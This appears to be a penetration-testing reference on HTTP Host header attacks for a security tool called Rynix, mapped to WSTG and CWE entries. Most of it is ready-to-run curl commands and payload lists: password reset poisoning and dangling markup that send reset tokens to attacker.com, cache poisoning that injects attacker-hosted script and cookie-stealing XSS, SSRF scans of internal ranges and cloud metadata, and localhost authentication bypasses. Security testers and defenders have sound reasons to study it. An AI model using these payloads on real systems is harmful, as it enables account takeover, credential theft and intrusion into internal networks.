---
id: PS-HOST
category: HTTP Host header attacks
lab_count: 7
wstg_refs: [WSTG-INPV-17]
---

# Host Header Attacks: Attack Technique Reference

HTTP Host header attacks exploit applications and intermediary servers that use the Host header value to determine routing, generate URLs, or make access control decisions. When the Host header is used in security-sensitive operations without validation, attackers can manipulate password reset links, poison web caches, bypass authentication, and perform server-side request forgery against internal infrastructure.

---

## 1. Detection

### 1A. Basic Host Header Reflection Test

Send a request with a modified Host header and check whether the value appears in the response body, headers, or email content.

```bash
# Check if Host header is reflected in response
curl -sk -H "Host: CANARY-HOST.com" https://TARGET/

# Check if Host is used in absolute URLs in the response
curl -sk -H "Host: evil.com" https://TARGET/ | grep -i "evil.com"

# Check password reset flow
curl -sk -H "Host: evil.com" -X POST -d "email=victim@target.com" https://TARGET/forgot-password
```

### 1B. Identify Host-Dependent Behavior

| Behavior | Test Method | Indicates |
|----------|------------|-----------|
| Response contains absolute URLs using Host | Change Host, check `<a href=` and `Location:` | URL generation from Host |
| Password reset email uses Host in link | Trigger reset with modified Host, check email | Reset poisoning possible |
| Different content for different Host values | Try `Host: localhost`, `Host: internal.app` | Virtual host routing |
| 302 redirect to Host value | Change Host, check Location header | Open redirect via Host |
| Cache varies by Host | Same path, different Host values, check cache key | Cache poisoning possible |

### 1C. Determine Host Validation Level

```bash
# 1. Direct replacement (most servers reject)
curl -sk -H "Host: evil.com" https://TARGET/

# 2. Port injection (often bypasses domain validation)
curl -sk -H "Host: TARGET:evil.com" https://TARGET/
curl -sk -H "Host: TARGET:@evil.com" https://TARGET/

# 3. Override headers (application may prefer these)
curl -sk -H "X-Forwarded-Host: evil.com" https://TARGET/
curl -sk -H "X-Host: evil.com" https://TARGET/

# 4. Duplicate Host headers
curl -sk -H "Host: TARGET" -H "Host: evil.com" https://TARGET/

# 5. Absolute URL with different Host
curl -sk --request-target "https://TARGET/" -H "Host: evil.com" https://TARGET/

# If any of these cause the injected value to appear in the response,
# the application is vulnerable
```

---

## 2. Techniques

### 2A. Password Reset Poisoning

When an application generates a password reset link using the Host header value, the attacker can inject their own domain. The victim receives a legitimate-looking reset email, but the link points to the attacker's server, capturing the reset token when clicked.

**Attack flow:**

1. Submit a password reset request for the victim's account
2. Set the Host header to the attacker's domain
3. The application generates a reset link like `https://ATTACKER.com/reset?token=SECRET`
4. The victim receives the email and clicks the link
5. The attacker's server captures the token from the request
6. The attacker uses the token on the real application to reset the victim's password

**Basic password reset poisoning:**

```bash
# Submit password reset with attacker's Host
curl -sk -X POST \
  -H "Host: attacker.com" \
  -d "email=victim@target.com" \
  https://TARGET/forgot-password
```

**When direct Host replacement is blocked, use override headers:**

```bash
# X-Forwarded-Host override
curl -sk -X POST \
  -H "Host: TARGET" \
  -H "X-Forwarded-Host: attacker.com" \
  -d "email=victim@target.com" \
  https://TARGET/forgot-password

# Duplicate Host header
curl -sk -X POST \
  -H "Host: TARGET" \
  -H "Host: attacker.com" \
  -d "email=victim@target.com" \
  https://TARGET/forgot-password
```

> Lab refs: PS-HOST-01, PS-HOST-07

**Dangling markup variant (PS-HOST-07):**

When the Host header is partially reflected in an HTML email but the full URL is not controllable, inject dangling markup to exfiltrate the token:

```bash
# Inject an unclosed HTML tag that captures everything after it
curl -sk -X POST \
  -H "Host: TARGET:'<a href=\"https://attacker.com/?" \
  -d "email=victim@target.com" \
  https://TARGET/forgot-password

# The email HTML becomes:
# <a href="https://TARGET:'<a href="https://attacker.com/?...token=SECRET...">
# The unclosed tag swallows the reset token into the attacker's URL
```

### 2B. Web Cache Poisoning via Host Header

When a web cache uses the URL path (but not the Host header) as the cache key, and the back-end server reflects the Host value in the response, the attacker can poison the cache with malicious content.

**Attack flow:**

1. Send a request to a cacheable resource with a modified Host header
2. The back-end generates a response using the attacker's Host value (e.g., in script src or link href)
3. The cache stores this poisoned response under the legitimate URL
4. All subsequent users receive the poisoned response with the attacker's payload

```bash
# Check if response varies with Host but cache key doesn't include Host
curl -sk -H "Host: evil.com" https://TARGET/
# If response contains evil.com in script/link tags AND is served from cache → vulnerable

# Poison with XSS payload
curl -sk -H "Host: attacker.com/exploit.js?" https://TARGET/
# If the response contains: <script src="https://attacker.com/exploit.js?/resources/js/app.js">
# The cache serves this to all users

# When direct Host change is rejected, use ambiguous requests:
# Duplicate Host (different servers pick different values)
curl -sk -H "Host: TARGET" -H "Host: attacker.com" https://TARGET/
```

The cache uses the first Host header for key generation (matching the legitimate domain), but the back-end uses the second Host header for URL generation (attacker's domain).

> Lab refs: PS-HOST-03

### 2C. SSRF via Host Header (Routing-Based SSRF)

Load balancers and reverse proxies route requests based on the Host header. By manipulating it, attackers can make the front-end server forward the request to an arbitrary internal host, bypassing firewall rules that only allow traffic from the front-end.

**Basic routing-based SSRF:**

```bash
# Try common internal IPs
curl -sk -H "Host: 192.168.0.1" https://TARGET/
curl -sk -H "Host: 10.0.0.1" https://TARGET/
curl -sk -H "Host: 127.0.0.1" https://TARGET/

# Scan internal network for admin panels
for i in $(seq 1 254); do
  curl -sk -o /dev/null -w "%{http_code} 192.168.0.$i\n" \
    -H "Host: 192.168.0.$i" https://TARGET/admin
done

# Use Collaborator/callback to confirm SSRF
curl -sk -H "Host: COLLABORATOR.oastify.com" https://TARGET/
```

**SSRF via flawed request parsing:**

When the Host header is validated but the request line can contain an absolute URL, the server may route based on the request-line host while using the Host header for validation.

```bash
# Absolute URL in request line overrides Host routing
curl -sk --request-target "https://192.168.0.1/admin" \
  -H "Host: TARGET" \
  https://TARGET/
```

Some intermediaries prioritize the Host in the request line over the Host header, routing the request to `192.168.0.1` while the Host header passes validation.

> Lab refs: PS-HOST-04, PS-HOST-05

### 2D. Authentication Bypass via Host Header

Applications that restrict access based on the Host header (e.g., admin panel only accessible on `localhost` or an internal hostname) can be bypassed by setting the Host to the expected internal value.

```bash
# Access admin panel restricted to localhost
curl -sk -H "Host: localhost" https://TARGET/admin

# Try internal hostnames
curl -sk -H "Host: internal.target.com" https://TARGET/admin
curl -sk -H "Host: admin.target.com" https://TARGET/admin
curl -sk -H "Host: backend.target.com" https://TARGET/admin

# Virtual host brute-force to discover internal apps
fuzz-cli -u https://TARGET/ -H "Host: FUZZ.target.com" \
  -w /path/to/subdomains.txt -mc all -fc 404
```

> Lab refs: PS-HOST-02

### 2E. Connection State Attacks

Some servers perform thorough Host header validation only on the first request over a connection but reuse the validated state for subsequent requests on the same keep-alive connection. After establishing trust with a valid first request, subsequent requests can use a modified Host header.

**Attack flow:**

1. Send a legitimate request with the correct Host header on a keep-alive connection
2. The server validates the Host and establishes the connection as trusted
3. Send a second request on the same connection with a malicious Host header
4. The server skips validation because the connection is already trusted

```bash
# Using HTTP/1.1 keep-alive to exploit connection state
# First request: legitimate (establishes trust)
# Second request: malicious Host (bypasses validation)

# With curl, use --next to send multiple requests on one connection:
curl -sk --http1.1 \
  -H "Host: TARGET" \
  -H "Connection: keep-alive" \
  https://TARGET/ \
  --next \
  -H "Host: 192.168.0.1" \
  https://TARGET/admin
```

In practice, this often requires http_probe replay with connection reuse, or a custom script that sends multiple requests on the same TCP socket.

> Lab refs: PS-HOST-06

---

## 3. Bypass Techniques

When direct Host header modification is rejected, these techniques may bypass validation.

### 3A. Host Override Headers

Many frameworks and reverse proxies recognize alternative headers that override the Host value:

```bash
# Primary override headers (try each individually)
X-Forwarded-Host: attacker.com
X-Host: attacker.com
X-Forwarded-Server: attacker.com
X-HTTP-Host-Override: attacker.com
Forwarded: host=attacker.com
X-Original-URL: /admin
X-Rewrite-URL: /admin

# Test all at once to find which one is honored
curl -sk -H "X-Forwarded-Host: attacker.com" https://TARGET/
curl -sk -H "X-Host: attacker.com" https://TARGET/
curl -sk -H "X-Forwarded-Server: attacker.com" https://TARGET/
curl -sk -H "X-HTTP-Host-Override: attacker.com" https://TARGET/
curl -sk -H "Forwarded: host=attacker.com" https://TARGET/
```

### 3B. Duplicate Host Headers

Different servers in the chain may prioritize different instances of duplicate headers:

```bash
# First Host for cache key, second Host for back-end processing
curl -sk -H "Host: TARGET" -H "Host: attacker.com" https://TARGET/

# Reversed order
curl -sk -H "Host: attacker.com" -H "Host: TARGET" https://TARGET/
```

### 3C. Absolute URL in Request Line

Supply a full URL in the request line. Some servers use the Host from the request line for routing while using the Host header for validation:

```bash
# GET https://internal.host/admin HTTP/1.1
# Host: TARGET
curl -sk --request-target "https://192.168.0.1/admin" -H "Host: TARGET" https://TARGET/
```

### 3D. Port Injection

When the application validates only the hostname portion but accepts a port, inject payloads via the port field:

```bash
# Non-numeric port (may be reflected in URLs)
curl -sk -H "Host: TARGET:bad-stuff-here" https://TARGET/

# Port with payload for XSS via Host
curl -sk -H "Host: TARGET:\"><script>alert(1)</script>" https://TARGET/

# Port with SSRF redirect
curl -sk -H "Host: TARGET:@attacker.com" https://TARGET/
```

### 3E. @ Symbol in Host

The `@` symbol in URLs separates credentials from the hostname. Some parsers interpret `Host: legit@evil.com` as credentials `legit` with hostname `evil.com`:

```bash
# Host interpreted as user@host
curl -sk -H "Host: TARGET@attacker.com" https://TARGET/

# In request line
curl -sk --request-target "https://TARGET@attacker.com/" https://TARGET/
```

### 3F. Subdomain Matching

If the application validates that Host ends with a specific domain, use a subdomain of the attacker's domain:

```bash
# If validation checks endsWith(".target.com")
curl -sk -H "Host: attacker.target.com" https://TARGET/

# If validation checks contains("target.com")
curl -sk -H "Host: target.com.attacker.com" https://TARGET/
```

---

## 4. Testing Payloads

### 4A. Detection Payloads

```bash
# Basic reflection test
Host: CANARY12345.com

# Override headers (test each individually)
Host: TARGET
X-Forwarded-Host: CANARY12345.com

Host: TARGET
X-Host: CANARY12345.com

Host: TARGET
Forwarded: host=CANARY12345.com

# Duplicate headers
Host: TARGET
Host: CANARY12345.com

# Port injection
Host: TARGET:CANARY12345

# Absolute URL
GET https://CANARY12345.com/ HTTP/1.1
Host: TARGET
```

### 4B. Password Reset Poisoning Payloads

```bash
# Direct replacement
Host: attacker.com

# Override headers
Host: TARGET
X-Forwarded-Host: attacker.com

# Port-based
Host: TARGET:@attacker.com

# Dangling markup (for HTML emails)
Host: TARGET:'<a href="https://attacker.com/?

# Subdomain
Host: attacker.TARGET
```

### 4C. SSRF / Routing Payloads

```bash
# Loopback
Host: 127.0.0.1
Host: localhost
Host: [::1]

# Internal ranges
Host: 192.168.0.1
Host: 10.0.0.1
Host: 172.16.0.1

# Internal hostnames
Host: internal
Host: admin.internal
Host: backend
Host: db.internal

# Cloud metadata
Host: 169.254.169.254

# Collaborator (confirm SSRF via callback)
Host: COLLABORATOR.oastify.com
```

### 4D. Authentication Bypass Payloads

```bash
# Localhost variations
Host: localhost
Host: 127.0.0.1
Host: localhost:80
Host: localhost:443
Host: 0.0.0.0
Host: [::1]

# Internal virtual hosts
Host: admin.TARGET
Host: internal.TARGET
Host: dev.TARGET
Host: staging.TARGET
Host: backend.TARGET
Host: intranet.TARGET
```

### 4E. Cache Poisoning Payloads

```bash
# Script source injection
Host: attacker.com/exploit.js?

# Full XSS via Host reflection
Host: "><script>alert(document.cookie)</script>

# Link injection
Host: attacker.com

# Combined with cache buster (to test without affecting other users)
GET /?cb=12345 HTTP/1.1
Host: attacker.com
```
## Rynix workflow

1. `get_technique_guide` for `host-header` — confirm test objectives.
2. `scope_check` + `register_scope` for the target host.
3. Static pass: `analyze_repo`, `rbac_matrix`, `high_risk_surfaces`.
4. Dynamic pass: `http_probe`, `compare_role_response`.
5. `record_finding` with probe evidence; `track_wstg_test` when mapped.

## Rynix tooling

- `http_probe`
- `compare_role_response`

## Evidence requirements

- Reproducible request/response or role-comparison diff.
- Session ID on all live tool calls.
- Link findings to endpoint + parameter, not generic claims.

## ASVS mapping

- V4 Access Control — role-appropriate responses for protected resources.
- V5 Validation — input handling for injection and parser differentials.

## CWE references

- CWE-284: Improper Access Control
- CWE-20: Improper Input Validation
## GenAI / LLM 2026 notes

- Cross-reference `knowledge/custom/genai_llm_security_2026.md` (OWASP LLM Top 10 mapping).
- Probe AI endpoints with `http_probe` only — no external LLM API keys in Rynix runtime.
- Use `compare_role_response` to detect cross-tenant prompt/response leakage.
- Map findings to LLM01–LLM10 categories in `export_report`.

